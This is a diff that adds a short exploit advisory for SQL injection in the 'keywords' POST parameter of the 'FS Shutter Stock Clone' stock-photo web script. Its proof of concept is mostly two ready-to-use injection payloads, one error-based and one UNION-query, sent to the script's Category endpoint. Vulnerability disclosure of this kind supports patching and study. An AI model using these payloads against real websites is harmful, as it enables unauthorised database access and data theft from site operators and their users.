@@ -1,0 +1,41 @@
+# Exploit Title: FS Shutter Stock Clone - 'keywords' SQL Injection
+# Date: 2017-10-24
+# Exploit Author: 8bitsec
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/shutterstock-clone/
+# Version: 24 October 17
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-10-24
+
+Product & Service Introduction:
+===============================
+This is a versatile script to help you to launch a stock photo like Shutterstock.
+
+Technical Details & Description:
+================================
+
+SQL injection on [keywords] parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+https://localhost/[path]/Category/
+
+Parameter: keywords (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: keywords=SEARCH' AND (SELECT 2673 FROM(SELECT COUNT(*),CONCAT(0x716b706b71,(SELECT (ELT(2673=2673,1))),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'UqZI'='UqZI&category=3
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: keywords=SEARCH' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b706b71,0x6251747761714a75646f44454749674748584975524b6c59687576456c68696761764659764a6954,0x71767a6b71)-- HXrZ&category=3
+
+==================
+8bitsec - [https://twitter.com/_8bitsec]
